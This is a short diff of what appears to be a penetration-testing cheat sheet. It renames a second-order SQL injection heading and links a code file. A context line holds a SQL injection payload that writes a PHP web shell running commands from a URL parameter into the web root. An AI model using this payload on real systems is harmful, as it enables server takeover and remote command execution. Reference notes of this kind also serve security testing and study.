@@ -577,8 +577,10 @@ https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS
   
 ' union select 1, 2, 3,"<\?php system($_GET['cmd']);\?>" into outfile "/var/www/html/pdp.php"-- -
   
-### SQL Injection Second-Order
-  
+### SQL Injection Second-Order (query connector)
+
+codes/sqli_second_order/sqlitwo.php
+
 ### SQL Injection Out-Of-Band
   
 ### Tamper's SQLMAP
